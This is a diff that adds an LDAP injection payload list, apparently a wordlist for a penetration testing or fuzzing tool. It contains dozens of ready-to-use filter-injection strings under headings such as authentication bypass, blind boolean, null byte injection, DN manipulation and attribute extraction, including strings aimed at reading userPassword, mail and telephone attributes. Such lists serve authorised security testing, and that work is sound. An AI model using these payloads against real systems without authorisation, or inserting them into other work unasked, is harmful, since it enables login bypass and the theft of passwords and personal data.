@@ -1,0 +1,77 @@
+# LDAP Injection Payloads
+
+# Basic wildcards
+*
+*)(uid=*))(|(uid=*
+admin*
+*()|%26'
+
+# Authentication bypass
+admin)(&(password=*))(|(password=*
+*)(&(password=*)
+admin*))%00
+*)(objectClass=*
+*)(|(objectClass=*
+admin))(|(cn=*
+*))(|(password=*)((password=*
+admin)(&(objectClass=person))
+
+# Filter manipulation
+)(cn=*
+)(|(cn=*
+)(&(cn=*
+*)(cn=*)(
+*)(|(cn=*))(*
+*)((cn=*
+*))((cn=*
+
+# Boolean-based blind
+admin)(uid=*
+admin)(uid=nonexistent
+*)(uid=admin
+*)(uid=randomuser12345
+admin)(&(cn=admin)
+admin)(&(cn=invalid)
+
+# Error-inducing
+)((
+))((
+\
+\00\00
+*)(*)(
+)(|()(|
+*))(cn=*
+
+# Null byte injection
+*)(uid=*))%00
+admin%00
+*)%00
+*))%00
+
+# Special character encoding
+\28
+\29
+\2a
+\5c
+\00
+\0a
+\0d
+
+# DN manipulation
+admin,ou=users
+*,ou=users,dc=domain
+)(cn=*))(|(ou=*
+
+# Attribute extraction
+*)(userPassword=*
+*)(mail=*
+*)(telephoneNumber=*
+*)(uid=admin)(|(uid=*
+
+# Common username patterns
+admin*
+user*
+test*
+dev*
+root*
+guest*
